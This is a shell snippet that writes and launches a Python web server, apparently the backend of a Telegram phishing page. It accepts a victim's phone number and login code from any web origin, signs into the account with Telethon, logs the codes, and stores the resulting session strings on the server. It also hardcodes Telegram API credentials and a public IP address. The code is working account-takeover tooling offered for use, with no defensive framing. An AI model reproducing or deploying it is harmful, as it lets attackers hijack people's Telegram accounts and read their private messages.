cat > /root/tg_session_host.py << 'EOF'
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import json
import random
import string
import os
import sys
from datetime import datetime

# Пытаемся импортировать telethon
try:
    from telethon import TelegramClient
    from telethon.sessions import StringSession
    from telethon.errors import SessionPasswordNeededError
    TELETHON_AVAILABLE = True
except ImportError:
    TELETHON_AVAILABLE = False
    print("Telethon not installed. Installing...")
    os.system("pip3 install telethon > /dev/null 2>&1")
    try:
        from telethon import TelegramClient
        from telethon.sessions import StringSession
        from telethon.errors import SessionPasswordNeededError
        TELETHON_AVAILABLE = True
    except:
        print("Failed to install telethon")

# Конфиг Telegram
API_ID = 9348118
API_HASH = "b6e1802b599d8f4fb8716fcd912f20f2"

# Хранилище
sessions_db = {}  # session_id -> {phone, phone_code_hash, client}
PORT = 5000

def log(msg):
    timestamp = datetime.now().strftime("%H:%M:%S")
    print(f"[{timestamp}] {msg}")

class TelegramSessionHandler(BaseHTTPRequestHandler):
    
    # CORS заголовки
    def _set_headers(self, status=200):
        self.send_response(status)
        self.send_header('Content-Type', 'application/json')
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'POST, GET, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type')
        self.end_headers()
    
    def do_OPTIONS(self):
        self._set_headers()
    
    def do_GET(self):
        if self.path == '/status':
            self._set_headers()
            response = {
                "status": "online",
                "service": "Telegram Session Creator",
                "telethon": TELETHON_AVAILABLE,
                "sessions_active": len(sessions_db),
                "time": datetime.now().isoformat()
            }
            self.wfile.write(json.dumps(response).encode())
        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({"error": "Not found"}).encode())
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        body = self.rfile.read(content_length).decode('utf-8')
        
        try:
            data = json.loads(body)
        except:
            data = {}
        
        # /auth/start - отправка номера телефона
        if self.path == '/auth/start':
            phone = data.get('phone', '')
            
            # Очищаем номер
            clean_phone = ''.join([c for c in phone if c.isdigit()])
            
            if len(clean_phone) < 11:
                self._set_headers(400)
                self.wfile.write(json.dumps({"error": "Invalid phone"}).encode())
                log(f"Invalid phone: {phone}")
                return
            
            # Добавляем код страны если нужно
            if not clean_phone.startswith('7') and not clean_phone.startswith('8'):
                clean_phone = '7' + clean_phone
            
            # Генерируем ID сессии
            session_id = ''.join(random.choices(string.digits + string.ascii_lowercase, k=16))
            
            log(f"Auth start: {clean_phone} -> {session_id}")
            
            if not TELETHON_AVAILABLE:
                self._set_headers()
                self.wfile.write(json.dumps({
                    "status": "test_mode",
                    "session_id": session_id,
                    "message": "Telethon not installed, test mode"
                }).encode())
                return
            
            try:
                # Создаем клиента Telegram
                client = TelegramClient(StringSession(), API_ID, API_HASH)
                
                # Подключаемся и запрашиваем код
                client.connect()
                sent_code = client.send_code_request(clean_phone)
                
                # Сохраняем в базу
                sessions_db[session_id] = {
                    'phone': clean_phone,
                    'phone_code_hash': sent_code.phone_code_hash,
                    'client': client,
                    'timestamp': datetime.now().isoformat()
                }
                
                self._set_headers()
                self.wfile.write(json.dumps({
                    "status": "success",
                    "session_id": session_id,
                    "message": f"Code sent to {clean_phone}"
                }).encode())
                
            except Exception as e:
                log(f"Telegram error: {str(e)}")
                self._set_headers(500)
                self.wfile.write(json.dumps({
                    "error": f"Telegram error: {str(e)}"
                }).encode())
        
        # /auth/code - проверка кода
        elif self.path == '/auth/code':
            session_id = data.get('session_id', '')
            code = data.get('code', '').strip().replace(' ', '')
            
            if session_id not in sessions_db:
                self._set_headers(400)
                self.wfile.write(json.dumps({"error": "Invalid session"}).encode())
                log(f"Invalid session: {session_id}")
                return
            
            if len(code) < 5:
                self._set_headers(400)
                self.wfile.write(json.dumps({"error": "Invalid code"}).encode())
                return
            
            session_data = sessions_db[session_id]
            client = session_data['client']
            phone = session_data['phone']
            
            log(f"Code verify: {phone} -> {code}")
            
            if not TELETHON_AVAILABLE:
                # Тестовый режим
                session_string = "TEST_SESSION_STRING"
                filename = f"/root/sessions/test_{session_id}.session"
                
                with open(filename, 'w') as f:
                    f.write(session_string)
                
                self._set_headers()
                self.wfile.write(json.dumps({
                    "status": "success",
                    "message": "Test session created",
                    "session_file": filename,
                    "phone": phone
                }).encode())
                
                if session_id in sessions_db:
                    del sessions_db[session_id]
                
                return
            
            try:
                # Пробуем войти с кодом
                client.sign_in(phone=phone, code=code, phone_code_hash=session_data['phone_code_hash'])
                
                # Получаем строку сессии
                session_string = client.session.save()
                
                # Сохраняем в файл
                os.makedirs('/root/telegram_sessions', exist_ok=True)
                filename = f"/root/telegram_sessions/{phone}_{session_id}.session"
                
                with open(filename, 'w') as f:
                    f.write(session_string)
                
                # Отключаем клиента
                client.disconnect()
                
                # Удаляем из активных сессий
                del sessions_db[session_id]
                
                log(f"Session created: {filename}")
                
                self._set_headers()
                self.wfile.write(json.dumps({
                    "status": "success",
                    "message": "Telegram session created",
                    "session_file": filename,
                    "phone": phone,
                    "session_string_length": len(session_string)
                }).encode())
                
            except SessionPasswordNeededError:
                self._set_headers(400)
                self.wfile.write(json.dumps({
                    "error": "2FA password required"
                }).encode())
                log(f"2FA required for {phone}")
                
            except Exception as e:
                error_msg = str(e)
                log(f"Sign in error: {error_msg}")
                
                # Закрываем клиент при ошибке
                try:
                    client.disconnect()
                except:
                    pass
                
                # Удаляем сессию
                if session_id in sessions_db:
                    del sessions_db[session_id]
                
                self._set_headers(400)
                
                if "phone_code_invalid" in error_msg:
                    self.wfile.write(json.dumps({
                        "error": "Invalid code"
                    }).encode())
                elif "phone_code_expired" in error_msg:
                    self.wfile.write(json.dumps({
                        "error": "Code expired"
                    }).encode())
                else:
                    self.wfile.write(json.dumps({
                        "error": f"Auth error: {error_msg}"
                    }).encode())
        
        else:
            self._set_headers(404)
            self.wfile.write(json.dumps({"error": "Not found"}).encode())
    
    def log_message(self, format, *args):
        pass

def main():
    log("=" * 60)
    log("Telegram Session Creator API")
    log("=" * 60)
    log(f"Starting server on port {PORT}")
    log(f"API ID: {API_ID}")
    log(f"Telethon available: {TELETHON_AVAILABLE}")
    log("")
    log("Endpoints:")
    log("  GET  /status         - Server status")
    log("  POST /auth/start     - Start auth with phone")
    log("  POST /auth/code      - Verify code and create session")
    log("")
    log("Sessions saved to: /root/telegram_sessions/")
    log("=" * 60)
    
    # Создаем папку для сессий
    os.makedirs('/root/telegram_sessions', exist_ok=True)
    
    # Запускаем сервер
    server = HTTPServer(('0.0.0.0', PORT), TelegramSessionHandler)
    
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        log("Server stopped")
        server.server_close()

if __name__ == '__main__':
    main()
EOF

# Даем права
chmod +x /root/tg_session_host.py

# Запускаем сервер в фоне
cd /root
screen -S telegram_host -dm python3 tg_session_host.py

# Проверяем
sleep 2
curl -s http://188.225.11.61:5000/status | python3 -m json.tool
